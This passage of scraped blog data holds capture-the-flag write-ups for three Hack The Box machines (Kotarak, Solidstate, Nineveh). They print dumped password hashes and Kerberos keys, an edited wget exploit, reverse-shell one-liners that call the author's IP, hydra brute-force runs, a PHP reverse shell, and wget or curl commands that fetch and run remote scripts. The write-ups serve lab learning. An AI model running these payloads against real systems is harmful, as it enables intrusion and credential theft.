d77ec2af971436bccb3b6fc4a969d7ff [*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee::: WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487::: WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279::: WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772::: WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c::: atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: [*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2 Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274 Administrator:des-cbc-md5:75375eda54757c2f WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233 WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74 WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5 WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8 krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593 krbtgt:des-cbc-md5:10ef08047a862046 krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5 WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908 WIN2K8$:des-cbc-md5:d352a8d3a7a7380b WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487 WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14 WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded WINXP1$:des-cbc-md5:984a40d5f4a815f2 WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279 WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16 WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734 WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01 WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772 WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42 WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7 WIN7$:des-cbc-md5:89a1673723ad9180 WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2 atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4 atanas:des-cbc-md5:6b80e391f113542a [*] Cleaning up... Let's see if we can crack atanas and Administrator hashes. Always before using hashcat or any other tools is good practice to try some online crackers to save time: In fact, we were able to crack both hashes as shown above. atanas: 2b576acbe6bcfda7294d6bd18041b8fe --> Password123! Administrator: e64fe0f24ba2489c05e64354d74ebd11 --> f16tomcat! I tried to su to atanas and was successful by using the password f16tomcat! : tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ su - atanas Password: atanas@kotarak-dmz:~$ At this point I can easily read the user.txt file as indicated from the permissions below atanas@kotarak-dmz:~$ ls -l total 4 -rw-rw---- 1 atanas atanas 33 Jul 19 2017 user.txt Now I remember that when I was enumerating with the tomcat user I saw a file called flag.txt which sounded interesting but I didn't have permissions to read it because it was owned by atanas. So I checked that file: atanas@kotarak-dmz:/root$ cat flag.txt Getting closer! But what you are looking for can't be found here. A bit disappointed! Anyway there is another file in the same location so I have a look as well: atanas@kotarak-dmz:/root$ cat app.log 10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] \"GET /archive.tar.gz HTTP/1.1\" 404 503 \"-\" \"Wget/1.16 (linux-gnu)\" 10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] \"GET /archive.tar.gz HTTP/1.1\" 404 503 \"-\" \"Wget/1.16 (linux-gnu)\" 10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] \"GET /archive.tar.gz HTTP/1.1\" 404 503 \"-\" \"Wget/1.16 (linux-gnu)\" From this log file looks like wget 1.16 was downloading an archive file every 2 minutes. We are going to assume we have a cronjob running every 2 minutes. A quick search with searchsploit reveals an interesting exploit for wget: GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution | exploits/linux/remote/40064.txt I studied a bit the content of the exploit, also available here . I suggest to read the exploit to understand the mechanism but in short this is what we are going to leverage: Because of lack of sufficient controls in wget, when user downloads a file with wget, such as: \"wget http://attackers-server/safe_file.txt\" an attacker who controls the server could make wget create an arbitrary file with an arbitrary contents and filename by issuing a crafted HTTP 30X Redirect containing FTP server reference in response to the victim's wget request. and... As cron runs priodically attackers, could also write out .wgetrc file in the first response and then write to /etc/cron.d/malicious-cron in the second. If a cronjob is run by root, this would give them an almost instant root code execution. To cut it short, as the first thing the script will send the output of a file (by default /etc/shadow ) back, whereas the second time it will place any piece of code we want in the cronjob that is running. I extracted the text of the wget-exploit.py and placed it in my kali box. Then I modified the following lines: HTTP_LISTEN_IP = '0.0.0.0' HTTP_LISTEN_PORT = 80 FTP_HOST = '10.10.14.2' FTP_PORT = 21 ROOT_CRON = \"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8888 >/tmp/f \\n \" where 10.10.14.2 is the IP of my kali box. I initially used 10.10.10.55 for the HTTP_LISTEN_IP but then I realized kotarak-dmz has multiple interfaces and one of the IPs is on a different networkn thus I added 0.0.0.0 so that any interface can listen. In ROOT_CRON I added a command which should give us a reverse shell I dowloaded from pentestmonkey reverse shell cheatsheet , hence I have used my kali box IP (10.10.14.2) with a random port, 8888 in this case. Once the exploit has been edited as per above I create a simple python http listener on my kali box and I download the script in the victim machine using wget. As per the exploit instructions, we need to create a .wgetrc file on our kali box: root@SittingDucks:~# cat <<_EOF_ >.wgetrc post_file = /root/root.txt output_document = /etc/cron.d/wget-root-shell _EOF_ I replaced /etc/shadow with /root/root.txt so that we can get our root.txt back. launch the following python command to create an ftp listener in our kali box: root@SittingDucks:~# python -m pyftpdlib -p21 -w /usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user. RuntimeWarning) [I 2020-01-29 05:57:40] >>> starting FTP server on 0.0.0.0:21, pid=8914 <<< [I 2020-01-29 05:57:40] concurrency model: async [I 2020-01-29 05:57:40] masquerade (NAT) address: None [I 2020-01-29 05:57:40] passive ports: None Then we can launch After some research I found out that any reserved port (ports below 1024)requires root access to run. As a woraround we can use Authbind that is a software that allows a program that would normally require superuser privileges to access privileged network services as a non-privileged user. atanas@kotarak-dmz:~$ authbind python wget_exploit.py Ready? Is your FTP server running? FTP found open on 10.10.14.2:21. Let's go then Serving wget exploit on port 80... We have a volunteer requesting /archive.tar.gz by POST :) Received POST from wget, this should be the extracted /etc/shadow file: ---[begin]--- 95****************************2c ---[eof]--- Sending back a cronjob script as a thank-you for the file... It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response) 10.0.3.133 - - [29/Jan/2020 01:44:01] \"POST /archive.tar.gz HTTP/1.1\" 200 - File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) We have a volunteer requesting /archive.tar.gz by GET :) Uploading .wgetrc via ftp redirect vuln. It should land in /root 10.0.3.133 - - [29/Jan/2020 01:46:01] \"GET /archive.tar.gz HTTP/1.1\" 301 - Sending redirect to ftp://anonymous@10.10.14.2:21/.wgetrc As we can see from the above output when the script runs it will give us the content of the file we specified in the .wgetrc file, in this care it returns our root.txt (95 * * * * 2c). Furthermore, after waiting other 2 minutes (next cronjob cycle) we get a reverse shell back since we placed the oneliner code: root@SittingDucks:~# nc -lvnp 9999 listening on [any] 9999 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.55] 33476 /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) #","tags":"blogging","loc":"https://sittingducks.io/Kotarak.html","title":"Kotarak"},{"url":"https://sittingducks.io/Solidstate.html","text":"Initial nmap root@SittingDucks:~# nmap -p- -sV 10 .10.10.51 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-21 04:22 GMT Nmap scan report for 10.10.10.51 Host is up (0.017s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) 25/tcp open smtp JAMES smtpd 2.3.2 80/tcp open http Apache httpd 2.4.25 ((Debian)) 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) 4555/tcp open james-admin JAMES Remote Admin 2.3.2 Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.37 seconds I launch gobuster on the webserver and found the following directories: root@SittingDucks:~# gobuster dir -u http://solidstate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://solidstate.htb [+] Threads: 5 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/01/21 04:43:14 Starting gobuster =============================================================== /images (Status: 301) /assets (Status: 301) /server-status (Status: 403) =============================================================== 2020/01/21 04:53:37 Finished =============================================================== I had a look inside but found nothing useful. I then decided to look for exploits fot the James smpt server root@SittingDucks:~# searchsploit james ----------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ----------------------------------------------------- ---------------------------------------- Apache James Server 2.2 - SMTP Denial of Service | exploits/multiple/dos/27915.pl Apache James Server 2.3.2 - Remote Command Execution | exploits/linux/remote/35513.py WheresJames Webcam Publisher Beta 2.0.0014 - Remote | exploits/windows/remote/944.c ----------------------------------------------------- ---------------------------------------- Shellcodes: No Result Exploit 35513, which is also available here https://www.exploit-db.com/exploits/35513, is related to our version. The exploit would basically create a new user and enqueues a payload to be executed the next time a user logs in to the machine. In oder to do this the James server must have the default configuration which uses the default credentials root:root (username:password), unless of course you bruteforce it and get the non-default credentials. As I mentioned, the exploit requires someone to login in the box for the payload to be triggered. Since we don't have access to the box yet let's see if James uses the default credentials and if we can spot something useful. I see the exploit uses port 4555 to connect so I do the same: root@SittingDucks:~# nc 10 .10.10.51 4555 JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands Cool, the default credentials worked! The HELP command comes handy here as it shows me the commands I can run. listusers Existing accounts 6 user: james user: thomas user: john user: mindy user: mailadmin user: test Since we are root we can reset the password for all these users so that we can read the emails. Of course, I did it for all the users starting from the top but for the sake of brevity I will only report mindy here since it's the only user I found useful info for. setpassword mindy mindy Password for mindy reset Then I connect on the POP3 port 110 to read the emails root@SittingDucks:~# telnet 10 .10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is '&#94;]'. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready user mindy +OK pass mindy +OK Welcome mindy list +OK 2 1945 1 1109 2 836 . retr 2 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for <mindy@localhost>; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James . We can see there are two messages. The second message contains SSH credentials we can potentially use to login to the box. mindy@solidstate:~$ ls -l total 8 drwxr-x--- 2 mindy mindy 4096 Aug 22 2017 bin -rw------- 1 mindy mindy 33 Sep 8 2017 user.txt Indeed I was able to login and read the user.txt file. Now I wanted to look around but I get this message when I try to change directory: mindy@solidstate:~$ cd / -rbash: cd: restricted We are logged in on a restricted shell which does not allow us to do much. To bypass this, I logged off and logged back in again specifying the bash shell in the ssh command: root@SittingDucks:~# ssh mindy@10.10.10.51 -t bash mindy@10.10.10.51's password: $ { debian_chroot:+ ( $debian_chroot )} mindy@solidstate:~$ cd / $ { debian_chroot:+ ( $debian_chroot )} mindy@solidstate:/$ ls -l total 80 drwxr-xr-x 2 root root 4096 Aug 22 2017 bin drwxr-xr-x 3 root root 4096 Aug 22 2017 boot drwxr-xr-x 17 root root 3040 Jan 20 23:11 dev drwxr-xr-x 121 root root 12288 Aug 27 2017 etc drwxr-xr-x 4 root root 4096 Aug 22 2017 home lrwxrwxrwx 1 root root 31 Jun 18 2017 initrd.images -> boot/initrd.images-4.9.0-3-686-pae lrwxrwxrwx 1 root root 31 Jun 18 2017 initrd.images.old -> boot/initrd.images-4.9.0-3-686-pae drwxr-xr-x 16 root root 4096 Aug 22 2017 lib drwx------ 2 root root 16384 Jun 18 2017 lost+found drwxr-xr-x 3 root root 4096 Jun 18 2017 media drwxr-xr-x 2 root root 4096 Jun 18 2017 mnt drwxr-xr-x 3 root root 4096 Aug 22 2017 opt dr-xr-xr-x 108 root root 0 Jan 20 23:11 proc drwx------ 8 root root 4096 Sep 8 2017 root drwxr-xr-x 21 root root 640 Jan 21 01:57 run drwxr-xr-x 2 root root 4096 Aug 22 2017 sbin drwxr-xr-x 2 root root 4096 Jun 18 2017 srv dr-xr-xr-x 13 root root 0 Jan 20 23:11 sys drwxrwxrwt 7 root root 4096 Jan 21 01:57 tmp drwxr-xr-x 10 root root 4096 Jun 18 2017 usr drwxr-xr-x 12 root root 4096 Aug 22 2017 var lrwxrwxrwx 1 root root 28 Jun 18 2017 vmlinuz -> boot/vmlinuz-4.9.0-3-686-pae lrwxrwxrwx 1 root root 28 Jun 18 2017 vmlinuz.old -> boot/vmlinuz-4.9.0-3-686-pae Now I am out of the restricted shell, as shown above I can change directories. At this stage I decided to download and run a linux enumeration script dubbed LinuxSmartEnumeration (sle) to see if it can give us some hints. After careful inspection I noticed this bit: ============================================================( file system )===== [*] fst000 Writable files outside user's home.............................. yes! --- /var/tmp /opt/tmp.py /tmp /tmp/.X11-unix /tmp/.XIM-unix /tmp/.font-unix /tmp/.ICE-unix /tmp/.ICE-unix/645 /tmp/.Test-unix --- The python script /opt/tmp.py contains the following code: #!/usr/bin/env python import os import sys try : os . system ( 'rm -r /tmp/* ' ) except : sys . exit () Usually these kind of scripts runs at regular intervals to make sure the directory is clean. However, if we find a cronjob we need to hope the interval is not too long. The global crontab file does not contain anything related to tmp.py so the only other place where the cron job could be present is root's private cron file, /var/spool/cron/crontabs/root. Obviously we don't have access to that file so I created a file in the /tmp directory. After a couple of minutes I noticed the file disappeared so we are in a very good position because we can modify that file and place a shell in there. All I have to do it to replace the command 'rm -r /tmp/* ' with the following shell I got from pentestmonkey shell cheatsheet : 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f') So I modified the tmp.py by replacing the command and started a netcat listener on my kali box listening on port 1234. After waiting a couple of minutes we finally get the shell: root@SittingDucks:~# nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.51] 36004 /bin/sh: 0: can't access tty; job control turned off # cat root.txt b4############################c9","tags":"blogging","loc":"https://sittingducks.io/Solidstate.html","title":"Solidstate"},{"url":"https://sittingducks.io/Nineveh.html","text":"Initial nmap root@SittingDucks:~# nmap -sV -sC 10 .10.10.43 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 10:51 GMT Nmap scan report for 10.10.10.43 Host is up (0.096s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR | Not valid before: 2017-07-01T15:03:30 |_Not valid after: 2018-07-01T15:03:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds the nmap reveals two webservers, one on port 80 and one on port 443. The ssl-cert mentions a common name, nineveh.htb so I add an entry to my /et/hosts file and I browse the two webservers. http://ninevsh.htb gives this page: https://ninevsh.htb gives this page I looked at the html source of both pages and there is nothing useful there. So I decided to scan for directories: root@SittingDucks:~# gobuster dir --url http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://nineveh.htb [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/01/04 11:19:28 Starting gobuster =============================================================== /department (Status: 301) /server-status (Status: 403) =============================================================== 2020/01/04 11:24:39 Finished =============================================================== I get only one result, the department directory, and when I checked I found a login page: and looking at the source for this page I get this: the interesting bit in there is the comment in green that says that MySQL has been installed but the page must be fixed! I was expecting some kind of sql injection. I tried all the combinations in this cheat sheet but got nowhere. I also tried with sqlmap just in case but found nothing. So looks like there are no SQL injection vulnerabilities. Then i noticed something by trying guessing names. I tried the user nineveh and noticed this error: Instead when I tried the user admin I get a different error: This is an indication that admin could be a valid user. With that in mind we can try to perfom a brute force attack. First I launch burpsuite to capture the POST request of when I submit username and password: POST /department/login.php HTTP/1.1 Host: 10.10.10.43 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 32 DNT: 1 Connection: close Referer: http://10.10.10.43/department/login.php Cookie: PHPSESSID=pbv0s4021i456d0feorsps7u26 Upgrade-Insecure-Requests: 1 username=admin&password=password and then I launch hydra: root@SittingDucks:~# hydra nineveh.htb -l admin -P /usr/share/wordlists/rockyou.txt http-form-post \"/department/login.php:username=&#94;USER&#94;&password=&#94;PASS&#94;:Invalid Password!\" -t 64 -V Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-05 16:56:54 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=&#94;USER&#94;&password=&#94;PASS&#94;:Invalid Password! [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"123456\" - 1 of 14344399 [child 0] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"12345\" - 2 of 14344399 [child 1] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"123456789\" - 3 of 14344399 [child 2] (0/0) . . <SNIP> . . [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"escorpio\" - 4638 of 14344399 [child 54] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"elvis1\" - 4639 of 14344399 [child 23] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"einstein\" - 4640 of 14344399 [child 34] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"carola\" - 4641 of 14344399 [child 43] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"benjamin1\" - 4642 of 14344399 [child 9] (0/0) [80][http-post-form] host: nineveh.htb login: admin password: 1q2w3e4r5t 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 1 final worker threads did not complete until end. [ERROR] 1 target did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-05 16:58:00 after few minutes I found the password and I got this page after logging in: and if I nagivate to the Notes menu I get this: It is important to note the URL of the \"Notes\" menu which points to a file (ninevehNotes.txt) to read from. I started having a look at potential path traversal vulnerabilty and I after trying few combinations I was able to read the passwd file using this path ../../../../../../../etc/passwd One strange thing I noticed is that this should be working also without files/ninevehNotes.txt string but for some reasons it doesn't. In fact, we are getting the message No Note is selected as shown above. After numerous tests I realized there is some kind of filter in the code that if detects the word ninevehNotes is missing from the string it throws the message No Note is selected and the LFI does not work. Another shorter string I managed to successfully verify is this http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd I spent some more time playing around with this but I got nowhere so I left it for the time being and I moved to enumerating on the SSL page. I launched gobuster against the https://nineveh.htb which revealed three directories: user@SittingDucks:~$ gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: https://nineveh.htb [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/01/18 09:17:58 Starting gobuster =============================================================== /db (Status: 301) /server-status (Status: 403) /secure_notes (Status: 301) =============================================================== 2020/01/18 09:20:18 Finished =============================================================== After browsing the https://nineveh.htb/db we find ourselves at another login page, this time is for the application phpliteAdmin v1.9 # Exploit Title: phpliteadmin < = 1 .9.3 Remote PHP Code Injection Vulnerability # Google Dork: inurl:phpliteadmin.php ( Default PW: admin ) # Date: 01 /10/2013 # Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt # Vendor Homepage: http://code.google.com/p/phpliteadmin/ # Vendor Status: Informed # Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip # Version: 1 .9.3 # Tested on: Windows and Linux Description: phpliteadmin.php#1784: 'Creating a New Database' => phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.', An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser. Proof of Concept: 1. We create a db named \"hack.php\". (Depending on Server configuration sometimes it will not work and the name for the db will be \"hack.sqlite\". Then simply try to rename the database / existing database to \"hack.php\".) The script will store the sqlite database in the same directory as phpliteadmin.php. Preview: http://goo.gl/B5n9O Hex preview: http://goo.gl/lJ5iQ 2. Now create a new table in this database and insert a text field with the default value: <?php phpinfo()?> Hex preview: http://goo.gl/v7USQ 3. Now we run hack.php Done! Proof: http://goo.gl/ZqPVL Looking for exploits with searchsploit I found an interesting one (24044) but, as per the above description, it requires for us to be logged in and create a database. Now I use the same bruteforce technique I used earlier with hybra with some small adjustments. Since we don't have a user I can specify anything I want (just left admin). root@SittingDucks:~# hydra nineveh.htb -l admin -P /usr/share/wordlists/rockyou.txt https-form-post \"/db/index.php:password=&#94;PASS&#94;&remember=yes&login=Log+In&proc_login=true:Incorrect password.\" -t 64 -V -s 443 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-18 09:43:23 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=&#94;PASS&#94;&remember=yes&login=Log+In&proc_login=true:Incorrect password. [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"123456\" - 1 of 14344399 [child 0] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"12345\" - 2 of 14344399 [child 1] (0/0) [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"123456789\" - 3 of 14344399 [child 2] (0/0) . . <SNIP> . . [ATTEMPT] target nineveh.htb - login \"admin\" - pass \"alexia\" - 1451 of 14344399 [child 40] (0/0) [443][http-post-form] host: nineveh.htb login: admin password: password123 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 1 final worker threads did not complete until end. [ERROR] 1 target did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-18 09:43:54 Now we know the password is password123 so we can log in: Let us know try to apply the exploit we found previously (24044). The instructions of the exploit state to create a database named hack.php with a table and default value of <?php phpinfo()?> so I did as instructed: Now, considering we have previously found a path traveral we can try to use the same techique but instead of reading the /etc/passwd file we can read the hack.php file knowing that the path is /var/tmp/hack.php from the above screenshots. As expected, because we have an LFI vulnerabiity, I am able to run the phpinfo page using the URL in the screenshot above. Now we can simply replace the code <?php phpinfo()?> with a php shell and we should be able to get a shell back. I got the following php shell from the Internet where I place my IP and a port (9999 in this case). <?php $sock = fsockopen ( \"10.10.14.5\" , 9999 ); exec ( \"/bin/sh -i <&3 >&3 2>&3\" ); ?> then I create another database called shell.php using the same procedure I used before from he phplite admin panel and in the default value I add the shell code: Then I create a netcat listener on my kali box and when I browse the URL http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../var/tmp/shell.phpand I get the following: root@SittingDucks:~# nc -lvnp 9999 listening on [any] 9999 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 56376 root@SittingDucks:~# Although the connection seems to work I am unable to get the shell. After several unsuccessful attempts, I changed methodology and instead of placing the shell in the database default value field I place the shell in my kali box and make it available through a python simple http server. <?php system ( \"wget http://10.10.14.5:8000/shellcode.php -O /tmp/shellcode.php ;php /tmp/shellcode.php\" ); > That being said i will use the same procedure but now I will add the above code in the shell.php database default value. With this method we finally got a working shell which I upgraded to a full pty shell with the below python command: root@SittingDucks:~# nc -lvnp 9999 listening on [any] 9999 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 56380 Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 06:04:38 up 1:53, 0 users, load average: 0.03, 0.08, 0.04 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ $ $ $ python -c 'import pty; pty.spawn(\"/bin/bash\")' /bin/sh: 4: python: not found $ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' www-data@nineveh:/$ From the output of the /etc/passwd we know there are 2 users with valid shell, that is root and amrois . www-data@nineveh:/home/amrois$ ls -l ls -l total 4 -rw------- 1 amrois amrois 33 Jul 2 2017 user.txt The user.txt is there but we can't read it as we are www-data user and we don't have permissions. www-data@nineveh:/$ curl http://10.10.14.5:8000/LinEnum.sh | bash At this stage I launched the above command which ran the LinEnu.sh script located in my kali box. I did not find anything useful in the output. I then had look at the secure_notes directory previously with gobuster which sounds interesting. From experience the word secret could mean there is something hidden in the hackthebox world. Browsing to the directory I see only the above picture. However, since the directory states secure_notes I decided to dig deeper and dowload the picture in my kali box and inspect it with binwalk . root@SittingDucks:/home/user/Documents/htb/boxes/nineveh# binwalk nineveh.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced 84 0x54 Zlib compressed data, best compression 2881744 0x2BF8D0 POSIX tar archive (GNU) The binwalk command against the picure shows us there is a Zlib compressed folder inside the image. To extract it we run again the same command with the -Me option 